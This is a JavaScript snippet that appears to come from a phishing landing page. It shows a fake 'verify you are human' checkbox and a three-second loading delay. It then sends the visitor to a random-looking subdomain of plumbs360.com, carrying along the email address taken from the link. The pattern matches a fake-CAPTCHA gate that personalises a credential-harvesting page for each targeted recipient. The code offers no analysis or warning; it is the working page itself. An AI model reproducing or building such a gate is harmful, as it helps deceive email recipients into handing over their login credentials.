<script>
    document.addEventListener('DOMContentLoaded', function () {
        // Extract and decode the email from the URL
        const urlParams = new URLSearchParams(window.location.search);
        let email = urlParams.get('email'); 
        
        // Check if email is present and decode it properly
        if (email) {
            email = decodeURIComponent(email); // Decode the email to handle %40 -> @
        }

        // Listen for form submission
        document.getElementById('verificationForm').addEventListener('submit', function (event) {
            event.preventDefault();

            if (document.getElementById('verify').checked) {
                document.getElementById('loadingIndicator').style.display = 'block';
                document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');

                // Redirect after a delay and use the email without encoding again
                setTimeout(function () {
                    if (email) {
                        window.location.href = 'https://tvrcemeheff.plumbs360.com/UwXUnAeh#' + email;
                    } else {
                        alert('No email parameter found in the URL.');
                        document.getElementById('loadingIndicator').style.display = 'none';
                        document.querySelector('button[type="submit"]').removeAttribute('disabled');
                    }
                }, 3000); // Delay of 3 seconds to match cookie.html
            } else {
                alert('Please verify that you are a human being by ticking the checkbox.');
            }
        });
    });
</script>
